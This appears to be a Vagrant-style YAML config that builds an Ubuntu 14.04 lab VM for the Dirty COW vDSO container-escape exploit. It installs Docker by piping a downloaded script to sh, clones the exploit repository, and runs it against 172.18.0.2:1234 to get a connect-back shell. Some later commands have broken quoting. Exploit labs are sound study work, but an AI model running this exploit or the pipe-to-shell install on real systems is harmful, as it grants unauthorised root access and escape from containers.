--- 
- 
  box: puppetlabs/ubuntu-14.04-64-nocm
  cpu: 2
  ip: "10.2.2.155"
  name: vDSO-exploit2
  forward_ports: 
    - {guest: 7777, host: 7777}
         
  ram: 2048
  shell_commands:
      - { shell: 'apt-get update -y && apt-get install -y wget git'}   
      - { shell: 'wget -qO- https://get.docker.com/ | sh'}
      - { shell: 'sysctl -w vm.max_map_count=262144'}
      - { shell: 'umask 0022'}
      - { shell: 'sudo curl -o /usr/local/bin/docker-compose -L "https://github.com/docker/compose/releases/download/1.14.0-rc1/docker-compose-$(uname -s)-$(uname -m)" ' }
      - { shell: 'sudo chmod 700 /usr/local/bin/docker-compose'}
       
      
      - { shell: 'git clone https://github.com/gebl/dirtycow-docker-vdso.git'}
      - { shell: 'cd /home/vagrant/dirtycow-docker-vdso && sudo docker-compose build '}
      - { shell: 'echo "Loging in to the docker container"  '}
      - { shell: 'echo "sudo docker-compose run dirtycow /bin/bash"  '}
      - { shell: ' cd /dirtycow-vdso"  '}
      - { shell: ' make"  '}
      - { shell: ' ./0xdeadbeef 172.18.0.2:1234"  '}
      - { shell: ' wait...."  '}
           
      